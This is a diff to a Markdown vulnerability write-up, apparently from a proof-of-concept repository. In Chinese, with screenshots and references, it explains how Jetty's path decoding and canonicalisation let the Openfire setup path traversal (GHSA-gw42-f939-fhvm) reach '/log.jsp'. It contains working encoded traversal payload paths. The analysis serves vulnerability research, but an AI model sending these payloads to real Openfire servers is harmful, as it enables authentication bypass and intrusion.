@@ -88,7 +88,44 @@ openfire\lib\jetty-http-9.4.43.v20210629.jar!\org\eclipse\jetty\http\HttpURI.cla
 /setup/setup-/%u002e./%u002e./log.jsp
 ```
 
+一些细节：
+![image](https://github.com/shadowsock5/Poc/assets/30398606/f63dfd7a-6e23-4011-b2eb-3d1e56c534ef)
+
+openfire\lib\jetty-util-9.4.43.v20210629.jar!\org\eclipse\jetty\util\URIUtil.class
+![image](https://github.com/shadowsock5/Poc/assets/30398606/e291fb82-1dc0-473e-b059-466d4147709e)
+
+openfire\lib\jetty-http-9.4.43.v20210629.jar!\org\eclipse\jetty\http\HttpURI.class
+![image](https://github.com/shadowsock5/Poc/assets/30398606/d83c058a-3a45-4a6d-a2f1-7524af4508ca)
+这里的
+```java
+String decodedNonCanonical = URIUtil.decodePath(this._path)
+```
+把
+```
+/setup/setup-/.%u002e/.%u002e/log.jsp
+=>
+/setup/setup-/../../log.jsp
+```
+然后
+```java
+this._decodedPath = URIUtil.canonicalPath(decodedNonCanonical)
+```
+把
+```
+/setup/setup-/../../log.jsp
+=>
+/log.jsp
+```
+
+这样在这里，
+openfire\lib\jetty-server-9.4.43.v20210629.jar!\org\eclipse\jetty\server\HttpChannelOverHttp.class
+
+![image](https://github.com/shadowsock5/Poc/assets/30398606/64f6a262-7743-4320-b199-fdfb98a811ec)
+
+已经被转换成了`/log.jsp`。
+
 
 ## Ref
 - https://mp.weixin.qq.com/s/cuULlP0F0Xf9Rhmkb-9H0g
+- https://mp.weixin.qq.com/s/EzfB8CM4y4aNtKFJqSOM1w
 - https://github.com/igniterealtime/Openfire/security/advisories/GHSA-gw42-f939-fhvm
